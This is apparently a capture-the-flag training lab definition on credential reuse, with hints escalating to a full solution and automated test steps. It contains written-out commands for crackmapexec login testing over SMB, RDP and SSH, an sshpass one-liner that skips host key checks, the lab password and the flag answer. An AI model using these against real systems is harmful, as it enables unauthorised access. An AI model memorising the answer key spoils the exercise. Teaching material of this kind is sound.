@@ -1,0 +1,386 @@
+name: Multi-Service Credential Reuse
+description: Test FinanceCorp credentials across multiple services (SMB, RDP, WinRM) to demonstrate comprehensive credential reuse risks.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - use one set of credentials on multiple services
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your cross-service credential testing for FinanceCorp has revealed that credentials 
+  work across multiple services. James Mitchell wants a comprehensive assessment of 
+  credential reuse across all services to understand the full lateral movement risk.
+  
+  Multi-service credential reuse demonstrates how a single compromised credential can 
+  provide access to multiple services, significantly expanding an attacker's access. 
+  FinanceCorp needs to see the complete picture of credential reuse risks.
+  
+  Your objective: Test discovered credentials against multiple FinanceCorp services 
+  (SMB, RDP, WinRM). Document all successful authentications to demonstrate the 
+  comprehensive scope of credential reuse vulnerabilities.
+
+flag: "OCR{cr3d_r3us3_mult1}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding Multi-Service Credential Reuse
+
+      **Multi-service credential reuse** extends the concept of cross-service
+      credential reuse to cover **three or more** different services. In enterprise
+      environments, it is extremely common to find the same credentials working
+      across SMB, RDP, SSH, and other services simultaneously.
+
+      ### The Three Services in This Lab
+
+      | Service | Port | Protocol | Purpose |
+      |---------|------|----------|---------|
+      | SMB | 445 | TCP | File sharing (Samba) |
+      | RDP | 3389 | TCP | Remote Desktop (xrdp) |
+      | SSH | 22 | TCP | Secure Shell (command line) |
+
+      ### Why Multi-Service Reuse is Dangerous
+
+      Each service provides a different type of access:
+      - **SMB** gives access to file shares - useful for data exfiltration
+      - **RDP** gives a full graphical desktop - useful for interactive access
+      - **SSH** gives command-line access - useful for executing commands
+
+      When the same credentials work on all three, an attacker has:
+      - Multiple paths to access the system
+      - Redundant access if one service is blocked
+      - Different capabilities depending on the service used
+
+      ### Your Goal
+
+      1. Enumerate all three services on the target
+      2. Test credentials against each service
+      3. Demonstrate that the same credentials work on SMB, RDP, and SSH
+      4. Use one of these access methods to retrieve the flag
+
+      Think about which service gives you the most direct path to read
+      files on the target system.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Tools for Multi-Service Credential Testing
+
+      ### Install Required Tools
+      ```bash
+      sudo apt install smbclient crackmapexec freerdp2-x11 openssh-client
+      ```
+
+      ### SMB Tools (Port 445)
+
+      **smbclient:**
+      ```bash
+      # List shares
+      smbclient -L //<target> -U <user>%<pass>
+      # Connect to share
+      smbclient //<target>/<share> -U <user>%<pass>
+      ```
+
+      **crackmapexec:**
+      ```bash
+      crackmapexec smb <target> -u <user> -p <pass>
+      ```
+
+      ### RDP Tools (Port 3389)
+
+      **xfreerdp:**
+      ```bash
+      xfreerdp /v:<target> /u:<user> /p:<pass> /cert:ignore
+      ```
+
+      **crackmapexec:**
+      ```bash
+      crackmapexec rdp <target> -u <user> -p <pass>
+      ```
+
+      ### SSH Tools (Port 22)
+
+      **ssh:**
+      ```bash
+      ssh <user>@<target>
+      # Enter password when prompted
+      ```
+
+      **crackmapexec:**
+      ```bash
+      crackmapexec ssh <target> -u <user> -p <pass>
+      ```
+
+      ### CrackMapExec: Multi-Protocol Testing
+
+      CrackMapExec is particularly useful here because it supports
+      **multiple protocols** with the same syntax:
+      ```bash
+      crackmapexec smb <target> -u <user> -p <pass>
+      crackmapexec rdp <target> -u <user> -p <pass>
+      crackmapexec ssh <target> -u <user> -p <pass>
+      ```
+
+      This makes it easy to test the same credentials across all services
+      quickly and consistently.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Practical Multi-Service Testing Examples
+
+      ### Step 1: Full Port Scan
+      ```bash
+      nmap -sV -p 22,445,3389 <target>
+      ```
+
+      Expected output:
+      ```
+      PORT     STATE SERVICE       VERSION
+      22/tcp   open  ssh           OpenSSH 8.x
+      445/tcp  open  netbios-ssn   Samba smbd 4.x
+      3389/tcp open  ms-wbt-server xrdp
+      ```
+
+      ### Step 2: Rapid Credential Testing with CrackMapExec
+      ```bash
+      # Test all three protocols
+      crackmapexec smb <target> -u admin -p password123
+      crackmapexec rdp <target> -u admin -p password123
+      crackmapexec ssh <target> -u admin -p password123
+      ```
+
+      Expected output for each:
+      ```
+      SMB  <target>  445   TARGET  [+] admin:password123
+      RDP  <target>  3389  TARGET  [+] admin:password123
+      SSH  <target>  22    TARGET  [+] admin:password123
+      ```
+
+      All three showing `[+]` confirms credential reuse across all services.
+
+      ### Step 3: Access via Each Service
+
+      **SMB - Check file shares:**
+      ```bash
+      smbclient -L //<target> -U admin%password123
+      smbclient //<target>/private -U admin%password123 -c "ls"
+      ```
+
+      **SSH - Direct command execution:**
+      ```bash
+      ssh admin@<target>
+      # Password: password123
+      # Then: ls /tmp/
+      ```
+
+      **RDP - Graphical desktop:**
+      ```bash
+      xfreerdp /v:<target> /u:admin /p:password123 /cert:ignore
+      ```
+
+      ### Key Insight
+
+      SSH provides the most direct path to read files. You can execute
+      commands like `cat /tmp/private/flag.txt` immediately after connecting.
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Multi-Service Reuse Workflow
+
+      ### Phase 1: Reconnaissance
+      ```bash
+      # Comprehensive port scan
+      nmap -sV -p 22,445,3389 <target>
+      ```
+
+      ### Phase 2: Credential Testing Across All Services
+      ```bash
+      # Test SMB
+      crackmapexec smb <target> -u admin -p password123
+
+      # Test RDP
+      crackmapexec rdp <target> -u admin -p password123
+
+      # Test SSH
+      crackmapexec ssh <target> -u admin -p password123
+      ```
+
+      Document which services accept the credentials. All three should
+      show `[+]` indicating successful authentication.
+
+      ### Phase 3: SMB Enumeration
+      ```bash
+      # List available shares
+      smbclient -L //<target> -U admin%password123
+
+      # Access the private share
+      smbclient //<target>/private -U admin%password123
+      smb: \> ls
+      smb: \> recurse ON
+      smb: \> ls
+      smb: \> exit
+      ```
+
+      ### Phase 4: SSH Access for Flag Retrieval
+      ```bash
+      # SSH gives direct command-line access
+      ssh admin@<target>
+      # Password: password123
+
+      # Once connected, search for the flag
+      find / -name "flag.txt" 2>/dev/null
+      cat /tmp/private/flag.txt
+      ```
+
+      ### Phase 5: Verify via RDP (Optional)
+      ```bash
+      xfreerdp /v:<target> /u:admin /p:password123 /cert:ignore
+      # Open terminal, run: cat /tmp/private/flag.txt
+      ```
+
+      ### Key Point
+
+      The flag is at `/tmp/private/flag.txt`. SSH is the fastest way to
+      retrieve it - one command after connecting.
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands to Solve This Lab
+
+      ### 1. Scan the Target
+      ```bash
+      nmap -sV -p 22,445,3389 <target>
+      ```
+
+      ### 2. Verify Credentials on All Three Services
+      ```bash
+      crackmapexec smb <target> -u admin -p password123
+      crackmapexec rdp <target> -u admin -p password123
+      crackmapexec ssh <target> -u admin -p password123
+      ```
+
+      ### 3. Enumerate SMB Shares
+      ```bash
+      smbclient -L //<target> -U admin%password123
+      ```
+
+      ### 4. Connect via SSH and Read the Flag
+      ```bash
+      ssh admin@<target>
+      ```
+      When prompted for password, enter: `password123`
+
+      Once connected:
+      ```bash
+      cat /tmp/private/flag.txt
+      ```
+
+      ### Alternative: One-Shot SSH Command
+      ```bash
+      sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@<target> "cat /tmp/private/flag.txt"
+      ```
+      (Install sshpass: `sudo apt install sshpass`)
+
+      ### Alternative: CrackMapExec with Command Execution
+      ```bash
+      crackmapexec ssh <target> -u admin -p password123 -x "cat /tmp/private/flag.txt"
+      ```
+
+      ### Alternative: Via SMB Share
+      ```bash
+      smbclient //<target>/private -U admin%password123 -c "ls"
+      # If flag.txt is in the share:
+      smbclient //<target>/private -U admin%password123 -c "more flag.txt"
+      ```
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Full Command Sequence
+
+      ```bash
+      # Step 1: Identify all services
+      nmap -sV -p 22,445,3389 <target>
+      # Output:
+      #   22/tcp   open  ssh           OpenSSH 8.x
+      #   445/tcp  open  netbios-ssn   Samba smbd 4.x
+      #   3389/tcp open  ms-wbt-server xrdp
+
+      # Step 2: Test credentials on SMB
+      crackmapexec smb <target> -u admin -p password123
+      # Output: SMB  <target>  445   [+] admin:password123
+
+      # Step 3: Test credentials on RDP
+      crackmapexec rdp <target> -u admin -p password123
+      # Output: RDP  <target>  3389  [+] admin:password123
+
+      # Step 4: Test credentials on SSH
+      crackmapexec ssh <target> -u admin -p password123
+      # Output: SSH  <target>  22    [+] admin:password123
+
+      # Step 5: Connect via SSH (fastest method)
+      ssh admin@<target>
+      # Password: password123
+
+      # Step 6: Read the flag
+      cat /tmp/private/flag.txt
+      # Output: OCR{...}
+      ```
+
+      ### Summary
+
+      | Step | Action | Tool | Service |
+      |------|--------|------|---------|
+      | 1 | Port scan | `nmap` | All |
+      | 2 | Test SMB | `crackmapexec smb` | SMB 445 |
+      | 3 | Test RDP | `crackmapexec rdp` | RDP 3389 |
+      | 4 | Test SSH | `crackmapexec ssh` | SSH 22 |
+      | 5 | Connect | `ssh` | SSH 22 |
+      | 6 | Read flag | `cat /tmp/private/flag.txt` | Filesystem |
+
+      ### Key Takeaways
+
+      - The credentials `admin:password123` worked on all three services:
+        SMB (445), RDP (3389), and SSH (22)
+      - This demonstrates **multi-service credential reuse** - a single
+        compromised credential provides access through multiple protocols
+      - SSH was the fastest path to retrieve the flag at `/tmp/private/flag.txt`
+      - In real-world assessments, always test credentials against every
+        discovered service to map the full scope of credential reuse
+      - Each service provides different capabilities: SMB for files,
+        RDP for desktop access, SSH for command execution
+      - Submit the flag value in the format `OCR{...}`
+
+credentials:
+  - username: "admin"
+    password: "password123"
+    role: "admin"
+    description: "admin credentials"
+
+workbook: "wiki/range/winpt/CH08_Credential_Reuse/03_Multi_Service_Credential_Reuse/"
+
+test:
+  steps:
+    - name: "Verify SMB, RDP, and SSH services are running"
+      command: "nmap -sV -p 22,445,3389 {target.target}"
+      expect: "22/tcp"
+
+    - name: "Verify SMB credentials with crackmapexec"
+      command: "crackmapexec smb {target.target} -u {cred.admin.user} -p {cred.admin.pass} 2>&1"
+      expect: "+"
+
+    - name: "Verify RDP credential reuse with crackmapexec"
+      command: "crackmapexec rdp {target.target} -u {cred.admin.user} -p {cred.admin.pass} 2>&1"
+      expect: "+"
+
+    - name: "Retrieve flag via SSH credential reuse"
+      command: "sshpass -p '{cred.admin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.admin.user}@{target.target} 'cat /tmp/private/flag.txt' 2>/dev/null"
+      expect: "OCR{cr3d_r3us3_mult1}"
